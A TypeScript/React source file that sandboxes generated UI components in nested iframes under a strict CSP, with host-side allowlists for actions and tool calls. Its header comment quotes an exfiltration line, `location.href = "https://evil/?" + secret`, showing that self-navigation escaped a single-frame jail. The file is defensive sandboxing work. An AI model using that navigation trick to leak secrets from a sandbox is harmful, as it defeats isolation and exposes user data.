import { useEffect, useMemo, useRef, useState, type CSSProperties } from "react";
import { islandToolFallbackManifest, islandVendoActionNames, type Json, type ToolOutcome } from "@vendoai/core";
import { ContainedNotice } from "../notice.js";
import { JAIL_RUNTIME_SOURCE } from "./runtime-bundle.gen.js";

const MAX_JAIL_HEIGHT = 8_192;

/**
 * The jail is TWO nested frames, and the nesting is the security boundary.
 *
 * CSP's fetch directives close every *subresource* channel out of generated
 * code — `connect-src 'none'` (fetch/XHR/WebSocket/sendBeacon), `img-src data:`
 * (pixel beacons) — and the sandbox (no allow-forms / allow-popups /
 * allow-same-origin) closes form posts, popups, and the parent realm. But a
 * document NAVIGATING ITSELF is governed by none of them: browser-verified,
 * `location.href = "https://evil/?" + secret` from inside a single-frame jail
 * reached the network and returned a real response.
 *
 * The directive that *does* govern a nested context's navigation is the
 * EMBEDDER's `frame-src`. So the generated code runs in an inner frame whose
 * embedder is an outer frame we author, whose `default-src 'none'` makes
 * `frame-src` fall back to `'none'` — blocking the inner frame's navigations
 * (and any frame it spawns) while `about:srcdoc` still loads. The outer frame
 * runs no untrusted code; it is a message relay, so the host's postMessage
 * identity check (source === iframe.contentWindow) still holds end to end.
 *
 * `'unsafe-eval'` is deliberate: evaluation is the jail's job (generated code
 * loads through the runtime's controlled `require`, which exposes only React,
 * so no import form can reach the module loader). NETWORK is what the jail
 * forbids, and `blob:` is banned from script-src because blob-ESM made the
 * loader reachable.
 */
function buildJailSrcdoc(): string {
  const nonce = jailNonce();
  const csp = [
    "default-src 'none'",
    `script-src 'nonce-${nonce}' 'unsafe-eval'`,
    "style-src 'unsafe-inline'",
    "img-src data:",
    "font-src data:",
    "connect-src 'none'",
  ].join("; ");
  const head = [
    `<meta http-equiv="Content-Security-Policy" content="${csp}">`,
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">",
    "<style>*,*::before,*::after{box-sizing:border-box}html,body{margin:0;padding:0;background:transparent;height:100%}iframe{display:block;width:100%;height:100%;border:0;background:transparent}</style>",
  ].join("");

  // The inner document: the runtime plus the generated code it later renders.
  const safeRuntime = JAIL_RUNTIME_SOURCE.replace(/<\/script/gi, "<\\/script");
  const inner = [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Generated Vendo component</title></head><body>",
    `<script nonce="${nonce}">${safeRuntime}<\/script>`,
    "</body></html>",
  ].join("");

  // The outer document: a trusted relay whose policy jails the inner frame's
  // navigations. Escaping `<` keeps the inner HTML from closing this script.
  const relay = `
var inner = document.createElement("iframe");
inner.setAttribute("sandbox", "allow-scripts");
inner.setAttribute("title", "Generated Vendo component");
inner.srcdoc = ${JSON.stringify(inner).replace(/</g, "\\u003C")};
document.body.appendChild(inner);
window.addEventListener("message", function (event) {
  if (event.source === parent) inner.contentWindow.postMessage(event.data, "*");
  else if (event.source === inner.contentWindow) parent.postMessage(event.data, "*");
});
`;
  return [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Vendo jail</title></head><body>",
    `<script nonce="${nonce}">${relay}<\/script>`,
    "</body></html>",
  ].join("");
}

/** A per-mount nonce. Not a secret: the srcdoc is fully ours (generated source
 *  never enters the HTML — it arrives over postMessage), so a non-crypto
 *  fallback keeps the jail working in non-secure contexts. */
function jailNonce(): string {
  const random = globalThis.crypto?.randomUUID?.();
  return (random ?? `${Date.now().toString(36)}${Math.random().toString(36).slice(2)}`).replaceAll("-", "");
}

export interface JailedComponentProps {
  name: string;
  source: string;
  /** Live tree props, MERGED OVER the furnishing's captured sampleProps: a
   *  node that sets only some props (e.g. a fork's `initialRange`) must not
   *  clobber the baseline's sample seed for the rest — partial props crashed
   *  captured components (remix eval fail class 4). Absent means the
   *  sampleProps rehearsal stub alone wins. */
  props?: Record<string, unknown>;
  furnishing?: JailFurnishing;
  /** Host brand tokens as `--vendo-*` custom properties, applied to the jail root. */
  themeVars?: Record<string, string>;
  /**
   * W4b §2 — the island's compiler-stamped tool manifest: the ONLY tools its
   * ambient `tools` calls may reach. `undefined` means the document predates
   * stamping and the manifest is derived from the source the HOST holds —
   * either way, nothing the iframe claims is ever trusted.
   */
  toolManifest?: readonly string[];
  onAction(action: string, payload?: Json): Promise<ToolOutcome>;
  onStateSet(key: string, value: Json): void;
}

export interface JailSubSource {
  source: string;
  imports: Record<string, string>;
}

export interface JailStyle {
  path: string;
  css: string;
}

/** Structural copy of the additive pin-baseline furnishing; ui depends on core only. */
export interface JailFurnishing {
  sourceImports?: Record<string, string>;
  subSources?: Record<string, JailSubSource>;
  sampleProps?: Record<string, unknown>;
  styles?: JailStyle[];
}

const IDENTIFIER_PATTERN = /^[A-Za-z_$][\w$]*$/;

/** A well-formed `tool-call` path: the literal member chain the jail runtime
 *  captured, as identifier segments. Anything else is dropped unanswered. */
const isToolCallPath = (value: unknown): value is string[] =>
  Array.isArray(value)
  && value.length > 0
  && value.every((segment) => typeof segment === "string" && IDENTIFIER_PATTERN.test(segment));

/** Every `$action` name embedded in the props the HOST sends into the jail —
 *  the legacy action channel's own least-privilege set. */
const collectActionNames = (value: unknown, into: Set<string>): void => {
  if (Array.isArray(value)) {
    for (const child of value) collectActionNames(child, into);
    return;
  }
  if (typeof value !== "object" || value === null) return;
  const record = value as Record<string, unknown>;
  if (typeof record.$action === "string") into.add(record.$action);
  for (const child of Object.values(record)) collectActionNames(child, into);
};

/** 08-ui §5 — generated code runs only in this opaque-origin iframe. */
export function JailedComponent({
  name,
  source,
  props,
  furnishing,
  themeVars,
  toolManifest,
  onAction,
  onStateSet,
}: JailedComponentProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [error, setError] = useState<string>();
  const srcDoc = useMemo(buildJailSrcdoc, []);
  // The island's tool surface, resolved on the HOST side only. A stamped
  // manifest wins; an unstamped document falls back to scanning the source the
  // host itself holds. The legacy action channel additionally admits the
  // action names the host embedded in the props it sent.
  const manifest = useMemo(
    () => new Set(toolManifest ?? islandToolFallbackManifest(source)),
    [source, toolManifest],
  );
  // Live node props merge OVER the captured sampleProps (never replace them
  // wholesale): a pinned fork whose node carries only `initialRange` still
  // gets the baseline's `valueCents`/`series` seed instead of crashing.
  const effectiveProps = useMemo(
    () => ({ ...furnishing?.sampleProps, ...props }),
    [furnishing, props],
  );
  const allowedActions = useMemo(() => {
    const allowed = new Set(manifest);
    collectActionNames(effectiveProps, allowed);
    // Legacy islands call `props.vendo.action("tool", …)` directly; their
    // literal action names in CODE (never strings/comments — review) are part
    // of the source the host holds, so they stay allowed.
    for (const literal of islandVendoActionNames(source)) allowed.add(literal);
    return allowed;
  }, [effectiveProps, manifest, source]);

  useEffect(() => {
    setError(undefined);
  }, [furnishing, name, source]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const sendRender = () => {
      iframe.contentWindow?.postMessage({
        vendo: true,
        kind: "render",
        source,
        props: effectiveProps,
        ...(furnishing?.sourceImports === undefined ? {} : { sourceImports: furnishing.sourceImports }),
        ...(furnishing?.subSources === undefined ? {} : { subSources: furnishing.subSources }),
        ...(furnishing?.styles === undefined ? {} : { styles: furnishing.styles }),
        ...(themeVars === undefined ? {} : { themeVars }),
      }, "*");
    };
    const handleMessage = (event: MessageEvent) => {
      if (event.source !== iframe.contentWindow) return;
      const message = event.data as Record<string, unknown> | undefined;
      if (!message) return;

      if (message.kind === "booted") {
        sendRender();
      } else if (message.kind === "state-set" && typeof message.key === "string") {
        onStateSet(message.key, message.value as Json);
      } else if (message.kind === "action" && typeof message.action === "string") {
        const requestId = message.requestId;
        // Never trust the iframe: only action names the host itself put in
        // reach (prop-embedded $action bindings, the stamped tool manifest,
        // literal vendo.action names in the source) may enter the pipe.
        if (!allowedActions.has(message.action)) {
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "action-result",
            requestId,
            error: `action "${message.action}" is not available to this island`,
          }, "*");
          return;
        }
        void onAction(message.action, message.payload as Json)
          .then((outcome) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              outcome,
            }, "*");
          })
          .catch((actionError: unknown) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              error: actionError instanceof Error ? actionError.message : String(actionError),
            }, "*");
          });
      } else if (message.kind === "tool-call" && typeof message.requestId === "string") {
        // W4b §2 — the ambient tools bridge. The literal member chain resolves
        // by underscore-join (tool names never contain dots); a resolved name
        // outside THIS island's manifest is blocked here, before the pipe.
        const requestId = message.requestId;
        if (!isToolCallPath(message.path)) {
          // Answer even a malformed request: a silent drop would leave the
          // island's promise pending forever (review).
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "tool-result",
            requestId,
            outcome: { status: "blocked", reason: "malformed tool call" },
          }, "*");
          return;
        }
        const toolName = message.path.join("_");
        if (!manifest.has(toolName)) {
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "tool-result",
            requestId,
            outcome: {
              status: "blocked",
              reason: `tool "${toolName}" is not in this island's tool manifest`,
            },
          }, "*");
          return;
        }
        void onAction(toolName, message.args as Json)
          .then((outcome) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "tool-result",
              requestId,
              outcome,
            }, "*");
          })
          .catch((toolError: unknown) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "tool-result",
              requestId,
              error: toolError instanceof Error ? toolError.message : String(toolError),
            }, "*");
          });
      } else if (message.kind === "error") {
        setError(typeof message.message === "string" ? message.message : "generated component failed");
      } else if (message.kind === "empty") {
        setError("generated component rendered no content");
      } else if (message.kind === "resize" && typeof message.height === "number" && Number.isFinite(message.height)) {
        iframe.style.height = `${Math.min(MAX_JAIL_HEIGHT, Math.max(1, message.height))}px`;
      }
    };

    window.addEventListener("message", handleMessage);
    iframe.addEventListener("load", sendRender);
    sendRender();
    return () => {
      window.removeEventListener("message", handleMessage);
      iframe.removeEventListener("load", sendRender);
    };
  }, [allowedActions, effectiveProps, furnishing, manifest, onAction, onStateSet, source, themeVars]);

  if (error) {
    return <ContainedNotice label="Generated component error">{`${name}: ${error}`}</ContainedNotice>;
  }

  const style: CSSProperties = {
    width: "100%",
    minHeight: "var(--vendo-jail-min-height, 16px)",
    border: 0,
    background: "transparent",
  };
  return (
    <iframe
      ref={iframeRef}
      title={`Generated component: ${name}`}
      sandbox="allow-scripts"
      srcDoc={srcDoc}
      style={style}
    />
  );
}
